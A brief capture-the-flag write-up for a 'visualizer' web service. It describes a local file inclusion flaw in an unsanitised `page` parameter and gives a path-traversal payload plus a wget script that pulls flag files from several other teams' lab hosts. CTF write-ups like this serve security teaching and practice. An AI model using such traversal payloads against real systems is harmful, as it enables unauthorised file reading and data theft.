Visualizer writeup
===========
### Vulnerability
There is local file inclusion vulnerability in visualizer system. \
The vulnerability originates from `static_page` in `web/web.py`, since it
does not check or sanitize `page` GET parameter.

### Payload
`http://10.0.101.103/get?page=../../../../var/ctf/flag`

### Full Exploit Code
Simple bash script using `wget` is sufficient.
```bash
wget http://10.0.102.103/get?page=../../../../var/ctf/flag -O flag_viz_team2
wget http://10.0.103.103/get?page=../../../../var/ctf/flag -O flag_viz_team3
wget http://10.0.104.103/get?page=../../../../var/ctf/flag -O flag_viz_team4
wget http://10.0.105.103/get?page=../../../../var/ctf/flag -O flag_viz_team5
wget http://10.0.106.103/get?page=../../../../var/ctf/flag -O flag_viz_team6
```
